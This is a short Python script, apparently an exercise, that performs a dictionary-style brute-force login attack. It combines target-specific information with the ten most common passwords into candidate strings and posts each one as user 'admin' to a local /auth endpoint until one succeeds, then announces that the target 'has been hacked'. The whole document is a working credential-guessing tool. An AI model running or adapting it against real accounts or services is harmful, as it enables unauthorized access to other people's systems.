import requests


with open('../target_info.txt', 'r') as target_info_file:
    target_info_list = target_info_file.read().strip().split('\n')
# print(target_info_list)

with open('../common_passwords_file.txt', 'r') as password_list_file:
    top_common_passwords_list = []
    for place in range(10):
        common_password = password_list_file.readline().strip()
        top_common_passwords_list.append(common_password)
# print(top_common_passwords_list)

smart_keyword_list = target_info_list + top_common_passwords_list
# print(smart_keyword_list)
base = len(smart_keyword_list)

number = 0
length = 0
login = 'admin'
net_protocol = 'http'
net_node = '127.0.0.1'
net_port = '5000'
net_path = 'auth'
net_query = '???'
net_address = 'http://127.0.0.1:5000/auth'

while length < 3:
    temp = number
    password = ''
    while temp != 0:
        rest = temp % base
        temp = temp // base
        password = smart_keyword_list[rest] + password
    password = smart_keyword_list[0] * (length - len(password)) + password
    print(f'Attempt №: {number}   Current length: {length}   Current password: {password}')
    response = requests.post(f'{net_protocol}://{net_node}:{net_port}/{net_path}', json={'login': login, 'password': password})
    if response.status_code == 200:
        print()
        print('Success! Target has been hacked!')
        print(f'Target login: {login}   Target password: {password}')
        break
    else:
        print(f'Status code: {response.status_code}')
    if smart_keyword_list[-1] * length == password:
        length += 1
        number = 0
    else:
        number += 1
